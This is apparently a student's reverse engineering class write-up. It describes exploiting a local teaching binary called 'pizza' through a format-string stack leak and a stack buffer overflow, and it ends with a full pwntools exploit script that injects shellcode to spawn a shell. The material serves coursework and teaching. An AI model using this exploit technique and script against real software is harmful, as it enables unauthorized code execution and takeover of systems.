# Control Flow Integrity Violation

The goal of this assignment is to write a python script using `pwntools` that executes the given program, leaks the stack offset, and spawns a shell. Through this exercise, we delve into the realm of control flow integrity violations, where unexpected inputs manipulate the program's execution flow, potentially leading to unauthorized access or unintended behavior.

In a previous class, we went into the concept of library injection, a method involving a loader program to run another program to load a library in a new thread. Dr. Reynolds highlighted a more direct approach to inject shellcode into vulnerable processes. This technique is based in providing unexpected input to a program, and thus altering the content of the instruction pointer register. By gaining control of the IP register, attackers gain the ability to manipulate the program's behavior at will. Although numerous methods exist to achieve this, we focused only on one: buffer overflow.

Dr. Reynolds explained that when a programmer permits writing more data into a buffer than its capacity, it leads to overwriting data higher up on the stack. This behavior typically results in undefined behavior or segmentation faults. However, attackers can exploit this vulnerability to their advantage. In a buffer overflow attack, attackers aim to overwrite the return address since it is eventually loaded into the IP register.

The approach for this assignment involves injecting shellcode directly into the buffer and ensuring that the IP register points to the beginning of this shellcode. Then later, the shellcode executes within the program, invoking functions like execve and replacing the current program with a shell accessible to the attacker.

## Requiered files and dependencies
- Install pwntools using the following commands on the terminal
  ```bash
  sudo apt-get update -y
  sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential -y
  sudo python3 -m pip install --upgrade pip -y
  sudo python3 -m pip install --upgrade pwntools -y
  ```
- Download the program we are going to take over. Victim program: [(Pizza)](https://github.com/tolvumadur/Reverse-Engineering-Class/blob/main/Spring24/Samples/binaries/pizza)
  
## Findings about the victim program: pizza
This program appears to be a simple pizza calculator/delivery app. Here's how it works:

1. The program prompts the user to input their name for the order.
2. After receiving the name input, it acknowledges the user with a greeting containing their name.
3. Then, it asks the user to specify the number of pizzas they would like to order, within the range of 1 to 10.
4. Upon receiving the number of pizzas, it confirms the order and informs the user that the pizzas will be prepared.
5. Next, it calculates the total cost of the order, including the cost of the pizzas and tax.
6. It displays the total amount to the user.
7. Finally, it requests the user to input their credit card number for payment.
8. After receiving the credit card number, it confirms the payment method and completes the transaction.

After using Ghidra to inspect the program we can see that the program is using a not very secure function that allows the user to input a format string. Dr. Reynolds mentioned that a format string such as `%p` can leak values from the stack.


## Process for building the script
We were asked by the professor to see if we were able to crash the program by running it and inputting data. So what we did was input a large number of random characters into the name field. As we gradually increased the input length, we observed the program's behavior. Upon reaching a certain threshold, the program crashed and displayed a segmentation fault error. This crash occurred because our input overflowed the buffer, thereby overwriting critical memory areas, including the return address. Consequently, the program became unable to execute further instructions, resulting in the segmentation fault error.

To achieve a succesful buffer overflow attack we need to meet three conditions:
1. We need to find out how many bytes after the beginning of the buffer are there before the return address.
2. We need to inject padding bytes plus a new return address, plus some shellcode.
3. We need to be able to predict at what address our shellcode will be so we can return to it.

To get started I ran the program using my python script with pwntools. In line 24 we are telling the program to run the pizza program. Then in lines 26 and 28 we are setting up some parameters about our proccesor and computer. Pwntools library includes a shellcode that we can use to spawn the shell, this is declared in line 35.
Then we input a format string to leak values from the stack (line 37). We run the program (line 39), recieve and print the welcome message (line 42), and then we send "our name" which in this case will be the format string to leak values (line 45). Recieve and print the Hi message that will contain the leak values (lines 47-48).

![image](https://github.com/horaciog1/CS479-Reverse-Engineering/assets/111658514/dda49cd8-5609-47a6-abc4-42da58c5d0e3)    


The output will look like this:   
![image](https://github.com/horaciog1/CS479-Reverse-Engineering/assets/111658514/2a0d9983-3d1b-47db-95ec-aa8df0c18061)   
If we pay close attention to the values printed, we can notice that the 3 last values are addresses from the stack (we know this because of the format).

We keep sending values from the other fields, we send a `10` for the number of pizzas, but for the credit card number we send a bunch of A's (it can be any character) to get the program to crash so that we can get a segfault error and this will generate a corefile containing information about the crash. I created a function to get stack information from the corefile of the crash, and my function prints the addresses and the values at that part, it also show us where the RSP (stack pointer) is pointing to.   

![image](https://github.com/horaciog1/CS479-Reverse-Engineering/assets/111658514/daf459ad-cbda-42ae-9b0e-ca57684f1bee)
![image](https://github.com/horaciog1/CS479-Reverse-Engineering/assets/111658514/a81186fc-3628-459b-ad86-0978a8bd3afb)



## Buffer Overflow script

```python3
#!/usr/bin/env python3

from pwn import *

def printStack(core):
    rsp = core.rsp
    stack_before_rsp = core.read(rsp - 22 * 8, 22 * 8)  # 22 elements before RSP
    stack_after_rsp = core.read(rsp, 22 * 8)  # 22 elements after RSP

    print("\nStack:")
    for i in range(0, len(stack_before_rsp), 8):
        address = rsp - 22 * 8 + i
        value = core.read(address, 8)
        arrow = "<---------- RSP" if address == rsp else "    "  # Point to RSP
        print(f"{hex(address)}\t{value}\t\t\t\t\t\t\t\t\t{arrow}")

    for i in range(0, len(stack_after_rsp), 8):
        address = rsp + i
        value = core.read(address, 8)
        arrow = "<---------- RSP" if address == rsp else "    "  # Point to RSP
        print(f"{hex(address)}\t{value}\t\t\t\t\t\t\t\t\t{arrow}")

# Executable and Linkable Format
elf = ELF("./pizza")

context(arch='amd64', os='linux', endian='little', word_size=64)

getname_address = elf.symbols["getname"]

#print(hex(getname_address))

#print(shellcraft.amd64.linux.sh())
#exit()

shellcode = asm(shellcraft.amd64.linux.sh())



input1 = b"%p %p %p %p %p %p %p %p %p"



victim = process("./pizza")

# Recieve Welcome Message
print(str(victim.recvline(), "latin-1"))

# Send Name
victim.sendline(input1)
# Recieve stack address leak output
leak = str(victim.recvline(), "latin-1")
print(leak)

# Send numberof pizzas and recieve output
victim.sendline(b"10")
print(str(victim.recvline(), "latin-1"))

# SHELL CODE + "A"*?? + NEW RET_ADDRESS
retAddr = int(leak.split(" ")[7], 16) - 112
input2 = shellcode + b"A"*88 + retAddr.to_bytes(8, 'little')

victim.sendline(input2)
#print(str(victim.recvline(), "latin-1"))


victim.interactive()
#core = victim.corefile

#printStack(core)

# print(disasm(core.read(core.rip, 8)))
# print( core.read( core.rsp, 100))


exit()
```
